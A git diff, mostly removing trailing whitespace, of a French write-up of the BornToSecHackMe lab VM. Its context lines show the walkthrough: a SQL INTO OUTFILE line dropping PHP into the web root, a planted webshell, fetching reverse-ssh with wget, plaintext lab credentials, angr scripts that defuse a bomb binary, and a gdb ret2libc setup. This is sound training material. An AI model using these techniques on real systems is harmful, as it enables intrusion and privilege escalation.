@@ -18,7 +18,7 @@ PORT    STATE SERVICE    VERSION
 21/tcp  open  ftp        vsftpd 2.0.8 or later
 |_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
 22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 07bf0220f08ac8481efc41aea446fa25 (DSA)
 |   2048 26dd80a3dfc44b531e534246ef6e30b2 (RSA)
 |_  256 cfc38c31d7477c84e2d21631b28e63a7 (ECDSA)
@@ -173,69 +173,69 @@ Une petite recherche sur le web permet de déterminer comment est organisé la c
 En voici les grandes lignes :
 
 ```apacheconf
-<VirtualHost *:80>                                                                                                     
-    ServerAdmin webmaster@localhost                                                                                    
-    ServerName BorntoSec                                                                                               
-    DocumentRoot /var/www                                                                                              
-                                                                                                                       
-    <Directory /var/www/forum>                                                                                         
-        SSLRequireSSL                                                                                                  
-    </Directory>                                                                                                       
-    <Directory /var/www/>                                                                                              
-        allow from all                                                                                                 
-    </Directory>                                                                                                       
-</VirtualHost>                                                                                                         
-                                                                                                                       
-<VirtualHost *:443>                                                                                                    
-    ServerAdmin webmaster@localhost                                                                                    
-    SSLEngine On                                                                                                       
-    SSLCertificateFile /etc/ssl/private/localhost.pem                                                                  
-                                                                                                                       
-Alias /phpmyadmin /usr/share/phpmyadmin                                                                                
-<Directory /usr/share/phpmyadmin>                                                                                      
-    Options FollowSymLinks                                                                                             
-    DirectoryIndex index.php                                                                                           
-    AllowOverride All                                                                                                  
-                                                                                                                       
-    <IfModule mod_php5.c>                                                                                              
-        AddType application/x-httpd-php .php                                                                           
-        php_flag magic_quotes_gpc Off                                                                                  
-        php_flag track_vars On                                                                                         
-        php_flag register_globals Off                                                                                  
-        php_admin_flag allow_url_fopen Off                                                                             
-        php_value include_path .                                                                                       
-        php_admin_value upload_tmp_dir /var/lib/phpmyadmin/tmp                                                         
-        php_admin_value open_basedir /usr/share/phpmyadmin/:/etc/phpmyadmin/:/var/lib/phpmyadmin/                      
-    </IfModule>                                                                                                        
-</Directory>                                                                                                           
-                                                                                                                       
-Alias /forum /var/www/forum                                                                                            
-<Directory /var/www/forum>                                                                                             
-    Options Indexes FollowSymLinks MultiViews                                                                          
-    <IfModule mod_php5.c>                                                                                              
-        php_flag register_globals off                                                                                  
-    </IfModule>                                                                                                        
-    <IfModule mod_dir.c>                                                                                               
-        DirectoryIndex index.php                                                                                       
-    </IfModule>                                                                                                        
+<VirtualHost *:80>
+    ServerAdmin webmaster@localhost
+    ServerName BorntoSec
+    DocumentRoot /var/www
+
+    <Directory /var/www/forum>
+        SSLRequireSSL
+    </Directory>
+    <Directory /var/www/>
+        allow from all
+    </Directory>
+</VirtualHost>
+
+<VirtualHost *:443>
+    ServerAdmin webmaster@localhost
+    SSLEngine On
+    SSLCertificateFile /etc/ssl/private/localhost.pem
+
+Alias /phpmyadmin /usr/share/phpmyadmin
+<Directory /usr/share/phpmyadmin>
+    Options FollowSymLinks
+    DirectoryIndex index.php
+    AllowOverride All
+
+    <IfModule mod_php5.c>
+        AddType application/x-httpd-php .php
+        php_flag magic_quotes_gpc Off
+        php_flag track_vars On
+        php_flag register_globals Off
+        php_admin_flag allow_url_fopen Off
+        php_value include_path .
+        php_admin_value upload_tmp_dir /var/lib/phpmyadmin/tmp
+        php_admin_value open_basedir /usr/share/phpmyadmin/:/etc/phpmyadmin/:/var/lib/phpmyadmin/
+    </IfModule>
 </Directory>
 
-Alias /webmail /usr/share/squirrelmail                                                                                 
-<Directory /usr/share/squirrelmail>                                                                                    
-    Options FollowSymLinks                                                                                             
-        <IfModule mod_php5.c>                                                                                          
-            php_flag register_globals off                                                                              
-        </IfModule>                                                                                                    
-        <IfModule mod_dir.c>                                                                                           
-            DirectoryIndex index.php                                                                                   
-        </IfModule>                                                                                                    
-                                                                                                                       
-        <Files configtest.php>                                                                                         
-            order deny,allow                                                                                           
-            deny from all                                                                                              
-            allow from 127.0.0.1                                                                                       
-        </Files>                                                                                                       
-    </Directory>                                                                                                       
+Alias /forum /var/www/forum
+<Directory /var/www/forum>
+    Options Indexes FollowSymLinks MultiViews
+    <IfModule mod_php5.c>
+        php_flag register_globals off
+    </IfModule>
+    <IfModule mod_dir.c>
+        DirectoryIndex index.php
+    </IfModule>
+</Directory>
+
+Alias /webmail /usr/share/squirrelmail
+<Directory /usr/share/squirrelmail>
+    Options FollowSymLinks
+        <IfModule mod_php5.c>
+            php_flag register_globals off
+        </IfModule>
+        <IfModule mod_dir.c>
+            DirectoryIndex index.php
+        </IfModule>
+
+        <Files configtest.php>
+            order deny,allow
+            deny from all
+            allow from 127.0.0.1
+        </Files>
+    </Directory>
 </VirtualHost>
 ```
 
@@ -251,7 +251,7 @@ SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/forum/templates_c/dvinfo.php
 
 J'y apprend que la machine est en 32 bits et que l'utilisateur courant est `www-data`. De la même façon je dépose un webshell.
 
-Je l'utilise pour rappatrier `reverse-ssh` en 32 bits à l'aide de `wget` puis, une fois le tunnel SSH établit, je fouille un peu puis trouve un dossier intéressan dans `/home` :
+Je l'utilise pour rappatrier `reverse-ssh` en 32 bits à l'aide de `wget` puis, une fois le tunnel SSH établit, je fouille un peu puis trouve un dossier intéressant dans `/home` :
 
 ```
 www-data@BornToSecHackMe:/$ ls /home/
@@ -270,7 +270,7 @@ drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 Le dossier contient un fichier qui renferme des identifiants :
 
 ```shellsession
-www-data@BornToSecHackMe:/home/LOOKATME$ cat password 
+www-data@BornToSecHackMe:/home/LOOKATME$ cat password
 lmezard:G!@M6f4Eatau{sF"
 ```
 
@@ -286,7 +286,7 @@ drwxrwx--x 1 www-data root        60 Oct 13  2015 ..
 -rw-r--r-- 1 root     root         1 Oct 15  2015 .bash_history
 -rwxr-x--- 1 lmezard  lmezard 808960 Oct  8  2015 fun
 -rwxr-x--- 1 lmezard  lmezard     96 Oct 15  2015 README
-lmezard@BornToSecHackMe:~$ cat README 
+lmezard@BornToSecHackMe:~$ cat README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 lmezard@BornToSecHackMe:~$ file fun
 fun: POSIX tar archive (GNU)
@@ -373,7 +373,7 @@ Now SHA-256 it and submit
 Comme indiqué dans le README on génère le hash sha256 :
 
 ```shellsession
-$ echo -n Iheartpwnage | sha256sum 
+$ echo -n Iheartpwnage | sha256sum
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
 ```
 
@@ -388,7 +388,7 @@ laurie@BornToSecHackMe:~$ ls -l
 total 27
 -rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
 -rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
-laurie@BornToSecHackMe:~$ cat README 
+laurie@BornToSecHackMe:~$ cat README
 Diffuse this bomb!
 When you have all the password use it as "thor" user with ssh.
 
@@ -446,30 +446,30 @@ Le code Python pour résoudre l'étape avec `angr` est le suivant :
 
 ```python
 import logging
-                                                                                                                       
+
 import angr
-                                                                                                                       
-logging.getLogger('angr.storage').setLevel(logging.ERROR)                                                              
-                                                                                                                       
-BINARY = "./bomb"                                                                                                      
-                                                                                                                       
-def is_defused(state):                                                                                                 
-    try:                                                                                                               
-        return b"defused" in state.posix.dumps(1)                                                                      
-    except:                                                                                                            
-        return False                                                                                                   
-                                                                                                                       
-def is_exploded(state):                                                                                                
-    try:                                                                                                               
-        return b"BOOM" in state.posix.dumps(1)                                                                         
-    except:                                                                                                            
-        return False                                                                                                   
-                                                                                                                       
-def solve_flag_1():                                                                                                    
-    project = angr.Project(BINARY)                                                                                     
-    sm = project.factory.simulation_manager()                                                                          
-    sm.use_technique(angr.exploration_techniques.DFS())                                                                
-    sm.explore(find=is_defused, avoid=is_exploded)                                                                     
+
+logging.getLogger('angr.storage').setLevel(logging.ERROR)
+
+BINARY = "./bomb"
+
+def is_defused(state):
+    try:
+        return b"defused" in state.posix.dumps(1)
+    except:
+        return False
+
+def is_exploded(state):
+    try:
+        return b"BOOM" in state.posix.dumps(1)
+    except:
+        return False
+
+def solve_flag_1():
+    project = angr.Project(BINARY)
+    sm = project.factory.simulation_manager()
+    sm.use_technique(angr.exploration_techniques.DFS())
+    sm.explore(find=is_defused, avoid=is_exploded)
     print(sm.found[0].posix.dumps(0).split(b"\0")[0].decode())
 ```
 
@@ -536,17 +536,17 @@ La difficulté majeure ici c'est que `angr` gère mal la fonction `scanf` qui es
 ```python
 def solve_flag_2():
     project = angr.Project(BINARY, auto_load_libs=False)
-    # addr = Juste après read_six_numbers                                                                                     
+    # addr = Juste après read_six_numbers
     initial_state = project.factory.blank_state(addr=0x08048b60)
     ints = [initial_state.solver.BVS(f"int{i}", 8*4) for i in range(6)]
     for i in range(6):
         initial_state.memory.store(initial_state.regs.ebp - 0x18 + 4*i, ints[i], endness='Iend_BE')
-                                    
-    sm = project.factory.simulation_manager(initial_state, save_unconstrained=True)                                            
-    sm.use_technique(angr.exploration_techniques.DFS())                                                                
-    sm.explore(find=lambda s: b"Keep going" in s.posix.dumps(1), avoid=is_exploded)                                    
-    found_state = sm.unconstrained[0]                                                                                        
-    answers = [found_state.solver.eval(intvar, cast_to=bytes) for intvar in ints]                                            
+
+    sm = project.factory.simulation_manager(initial_state, save_unconstrained=True)
+    sm.use_technique(angr.exploration_techniques.DFS())
+    sm.explore(find=lambda s: b"Keep going" in s.posix.dumps(1), avoid=is_exploded)
+    found_state = sm.unconstrained[0]
+    answers = [found_state.solver.eval(intvar, cast_to=bytes) for intvar in ints]
     print(' '.join([str(unpack('<I', answer)[0]) for answer in answers]))
 ```
 
@@ -561,7 +561,7 @@ Le problème vient certainement plus d'une mauvaise utilisation d'`angr` de ma p
 A la fin je fais afficher les valeurs attachées à mes entiers symboliques :
 
 ```shellsession
-$ python defuse.py 
+$ python defuse.py
 WARNING  | 2022-11-28 23:26:45,295 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 23:26:45,297 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
 WARNING  | 2022-11-28 23:26:46,794 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_1b_10_32{UNINITIALIZED}>
@@ -577,25 +577,25 @@ Ce qui nous importe ici c'est que le programme effectue un scanf avec `%d %c %d`
 Le code pour `angr` est très proche du précédent :
 
 ```python
-def solve_flag_3():                                                                                                    
-    start = 0x08048bbc                                                                                                 
-    end = 0x08048aae                                                                                                   
-    project = angr.Project(BINARY, auto_load_libs=False)                                                               
-    state = project.factory.blank_state(addr=start)                                                                    
-    int1 = state.solver.BVS("int1", 8*4)                                                                               
-    state.memory.store(state.regs.ebp - 0xc, int1, endness='Iend_BE')                                                  
-    char = state.solver.BVS("char", 8*4)                                                                               
-    state.memory.store(state.regs.ebp - 0xc + 4, char, endness='Iend_LE')                                              
-    int2 = state.solver.BVS("int2", 8*4)                                                                               
-    state.memory.store(state.regs.ebp - 0xc + 8, int2, endness='Iend_BE')                                              
-                                                                                                                       
-    sm = project.factory.simulation_manager(state, save_unconstrained=True)                                            
-    sm.explore(find=end, avoid=0x080494fc)                                                                             
-    for found in sm.unconstrained:                                                                                     
-        print(                                                                                                         
-            unpack("<I", found.solver.eval(int1, cast_to=bytes))[0],                                                   
-            chr(found.solver.eval(char, cast_to=bytes)[0]),                                                            
-            unpack("<I", found.solver.eval(int2, cast_to=bytes))[0],                                                   
+def solve_flag_3():
+    start = 0x08048bbc
+    end = 0x08048aae
+    project = angr.Project(BINARY, auto_load_libs=False)
+    state = project.factory.blank_state(addr=start)
+    int1 = state.solver.BVS("int1", 8*4)
+    state.memory.store(state.regs.ebp - 0xc, int1, endness='Iend_BE')
+    char = state.solver.BVS("char", 8*4)
+    state.memory.store(state.regs.ebp - 0xc + 4, char, endness='Iend_LE')
+    int2 = state.solver.BVS("int2", 8*4)
+    state.memory.store(state.regs.ebp - 0xc + 8, int2, endness='Iend_BE')
+
+    sm = project.factory.simulation_manager(state, save_unconstrained=True)
+    sm.explore(find=end, avoid=0x080494fc)
+    for found in sm.unconstrained:
+        print(
+            unpack("<I", found.solver.eval(int1, cast_to=bytes))[0],
+            chr(found.solver.eval(char, cast_to=bytes)[0]),
+            unpack("<I", found.solver.eval(int2, cast_to=bytes))[0],
         )
 ```
 
@@ -606,7 +606,7 @@ Cette fois l'option passée à `find` n'est pas une chaine de caractère qui doi
 Exécution :
 
 ```shellsession
-$ python defuse.py 
+$ python defuse.py
 WARNING  | 2022-11-28 23:42:23,130 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 23:42:23,132 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
 WARNING  | 2022-11-28 23:42:25,753 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
@@ -706,16 +706,16 @@ func4 (va_list arg_8h);
 Même s'il est simple, le code de résolution est celui qui prend le plus de temps à l'exécution, certainement à cause de la récursivité :
 
 ```python
-def solve_flag_4():                                                                                                    
-    start = 0x08048d03                                                                                                 
-    end = 0x08048d2a                                                                                                   
-    project = angr.Project(BINARY, auto_load_libs=False)                                                               
-    initial_state = project.factory.blank_state(addr=start)                                                            
-    int1 = initial_state.solver.BVS("int1", 8*4)                                                                       
-    initial_state.memory.store(initial_state.regs.ebp - 0x4, int1, endness='Iend_BE')                                  
-    sm = project.factory.simulation_manager(initial_state)                                                             
-    sm.explore(find=end, avoid=0x080494fc)                                                                             
-    solution_state = sm.found[0]                                                                                       
+def solve_flag_4():
+    start = 0x08048d03
+    end = 0x08048d2a
+    project = angr.Project(BINARY, auto_load_libs=False)
+    initial_state = project.factory.blank_state(addr=start)
+    int1 = initial_state.solver.BVS("int1", 8*4)
+    initial_state.memory.store(initial_state.regs.ebp - 0x4, int1, endness='Iend_BE')
+    sm = project.factory.simulation_manager(initial_state)
+    sm.explore(find=end, avoid=0x080494fc)
+    solution_state = sm.found[0]
     print(unpack("<I", solution_state.solver.eval(int1, cast_to=bytes))[0])
 ```
 
@@ -735,24 +735,24 @@ def solve_flag_5():
     end = 0x08048d94 # end of function on "ret" instruction
 
     project = angr.Project(BINARY, auto_load_libs=False)
-    # Hooking some function we know the behavior should fasten things a bit                                            
-    project.hook(0x08049018, angr.SIM_PROCEDURES["libc"]["strlen"]())                                                  
-    project.hook(0x08049030, angr.SIM_PROCEDURES["libc"]["strcmp"]())                                                  
-    # We need a 6 chars string but let's say 7 and put a null byte at the end                                          
-    secret = claripy.BVS("secret", 8*7)                                                                                
-    initial_state = project.factory.call_state(                                                                        
-            start,                                                                                                     
-            angr.PointerWrapper(secret, buffer=True),                                                                  
+    # Hooking some function we know the behavior should fasten things a bit
+    project.hook(0x08049018, angr.SIM_PROCEDURES["libc"]["strlen"]())
+    project.hook(0x08049030, angr.SIM_PROCEDURES["libc"]["strcmp"]())
+    # We need a 6 chars string but let's say 7 and put a null byte at the end
+    secret = claripy.BVS("secret", 8*7)
+    initial_state = project.factory.call_state(
+            start,
+            angr.PointerWrapper(secret, buffer=True),
     )
 
-    # Let's add some constraints to our input string                                                                   
+    # Let's add some constraints to our input string
     # Chars should be lowercase
-    for i in range(6):                                                                                                 
-        c = secret.get_byte(i)                                                                                         
-        initial_state.add_constraints(initial_state.solver.And(c >= ord("a"), c <= ord("z")))                          
-                                                                                                                       
-    # null byte                                                                                                        
-    c = secret.get_byte(6)                                                                                             
+    for i in range(6):
+        c = secret.get_byte(i)
+        initial_state.add_constraints(initial_state.solver.And(c >= ord("a"), c <= ord("z")))
+
+    # null byte
+    c = secret.get_byte(6)
     initial_state.add_constraints(c == 0)
 
     sm = project.factory.simulation_manager(initial_state)
@@ -770,7 +770,7 @@ Avant de lancer la recherche avec la fonction `explore` je spécifie sur l'état
 L'exécution est rapide :
 
 ```shellsession
-$ python defuse.py 
+$ python defuse.py
 WARNING  | 2022-11-28 22:25:29,871 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 22:25:29,873 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
 WARNING  | 2022-11-28 22:25:29,881 | angr.calling_conventions | Guessing call prototype. Please specify prototype.
@@ -784,41 +784,41 @@ La dernière fonction lit 6 entiers sur l'entrée standard.  Il y a de multiples
 Dans le code `angr` suivant j'exploite des fonctionalités supplémentaires. Déjà le loader permet de trouver l'adresse d'une fonction via son nom (car l'exécutable n'est pas strippé). Deuxièmement je hooke la fonction de lecture des 6 entiers pour quelle retourne directement mes 6 valeurs symboliques. La fonction `run` ci-dessous met en mémoire les 6 valeurs et retourne 6 car la vrai fonction doit retourner le nombre d'entiers reçus.
 
 ```python
-class read_six_numbers_hook(angr.SimProcedure):                                                                        
-    answer_ints = []  # class variable                                                                                 
-    int_addrs = []                                                                                                     
-                                                                                                                       
-    def run(self, __, int_addr):                                                                                       
-        self.int_addrs.append(int_addr)                                                                                
-        for i in range(6):                                                                                             
-            bvs = self.state.solver.BVS("phase6_int_%d" % i, 32)                                                       
-            self.answer_ints.append(bvs)                                                                               
-            self.state.mem[int_addr].int.array(6)[i] = bvs                                                             
-                                                                                                                       
-        return 6                                                                                                       
-                                                                                                                       
-                                                                                                                       
-def solve_flag_6():                                                                                                    
-    project = angr.Project(BINARY, auto_load_libs=False)                                                               
-    project.analyses.CFG()                                                                                             
-                                                                                                                       
-    phase_6 = project.loader.find_symbol("phase_6").rebased_addr                                                       
-    read_six_numbers = project.loader.find_symbol("read_six_numbers").rebased_addr                                     
-    project.hook(read_six_numbers, read_six_numbers_hook())                                                            
-    initial_state = project.factory.blank_state(addr=phase_6)                                                          
-                                                                                                                       
+class read_six_numbers_hook(angr.SimProcedure):
+    answer_ints = []  # class variable
+    int_addrs = []
+
+    def run(self, __, int_addr):
+        self.int_addrs.append(int_addr)
+        for i in range(6):
+            bvs = self.state.solver.BVS("phase6_int_%d" % i, 32)
+            self.answer_ints.append(bvs)
+            self.state.mem[int_addr].int.array(6)[i] = bvs
+
+        return 6
+
+
+def solve_flag_6():
+    project = angr.Project(BINARY, auto_load_libs=False)
+    project.analyses.CFG()
+
+    phase_6 = project.loader.find_symbol("phase_6").rebased_addr
+    read_six_numbers = project.loader.find_symbol("read_six_numbers").rebased_addr
+    project.hook(read_six_numbers, read_six_numbers_hook())
+    initial_state = project.factory.blank_state(addr=phase_6)
+
     sm = project.factory.simulation_manager(initial_state)
     # Cherche à atteindre la dernière instruction de la fonction sans exploser
-    sm.explore(find=0x08048e90, avoid=is_exploded)                                                                     
-    found_state = sm.found[0]                                                                                          
-    answer = [found_state.solver.eval(x) for x in read_six_numbers_hook.answer_ints]                                   
+    sm.explore(find=0x08048e90, avoid=is_exploded)
+    found_state = sm.found[0]
+    answer = [found_state.solver.eval(x) for x in read_six_numbers_hook.answer_ints]
     print(' '.join(map(str, answer)))
 ```
 
 Résultat :
 
 ```shellsession
-python defuse.py 
+python defuse.py
 WARNING  | 2022-11-28 22:44:29,571 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
 WARNING  | 2022-11-28 22:44:29,574 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
 4 2 6 3 1 5
@@ -829,7 +829,7 @@ WARNING  | 2022-11-28 22:44:29,574 | cle.loader     | For more information about
 On final ça se passe comme ça :
 
 ```shellsession
-$ ./bomb 
+$ ./bomb
 Welcome this is my little bomb !!!! You have 6 stages with
 only one life good luck !! Have a nice day!
 Public speaking is very easy.
@@ -863,9 +863,9 @@ Quand on voit [les solutions pour le binaire du CMU](https://redpwn.net/writeups
 Une fois connecté avec l'utilisateur `thor` on remarque une fois de plus qu'il n'est pas membre de groupes intéressants et qu'il dispose de deux fichiers dans on home :
 
 ```shellsession
-thor@BornToSecHackMe:~$ cat README 
+thor@BornToSecHackMe:~$ cat README
 Finish this challenge and use the result as password for 'zaz' user.
-thor@BornToSecHackMe:~$ head -5 turtle 
+thor@BornToSecHackMe:~$ head -5 turtle
 Tourne gauche de 90 degrees
 Avance 50 spaces
 Avance 1 spaces
@@ -941,7 +941,7 @@ On a donc le controle sur le pointeur d'instruction. On peut jouer directement a
 La présence d'un 0 dans le fichier `/proc/sys/kernel/randomize_va_space` indique que l'ASLR n'est pas activé sur la VM. On a récupérer l'adresse de `system()`, trouver une chaine de caractères (n'importe laquelle) qui permettra de spécifier une commande à exécuter et ça devrait faire l'affaire :
 
 ```nasm
-zaz@BornToSecHackMe:~$ gdb -q ./exploit_me 
+zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
 Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
 (gdb) disass main
 Dump of assembler code for function main:
@@ -964,13 +964,13 @@ Dump of assembler code for function main:
    0x08048429 <+53>:    mov    %eax,(%esp)
    0x0804842c <+56>:    call   0x8048310 <puts@plt>
    0x08048431 <+61>:    mov    $0x0,%eax
-   0x08048436 <+66>:    leave  
-   0x08048437 <+67>:    ret    
+   0x08048436 <+66>:    leave
+   0x08048437 <+67>:    ret
 End of assembler dump.
 (gdb) b *main
 Breakpoint 1 at 0x80483f4
 (gdb) r
-Starting program: /home/zaz/exploit_me 
+Starting program: /home/zaz/exploit_me
 
 Breakpoint 1, 0x080483f4 in main ()
 (gdb) p system
@@ -982,12 +982,12 @@ Mapped address spaces:
         Start Addr   End Addr       Size     Offset objfile
          0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
          0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
-        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
         0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
         0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
         0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7fd2000 0xb7fd5000     0x3000        0x0 
-        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fdb000 0xb7fdd000     0x2000        0x0
         0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
         0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
         0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
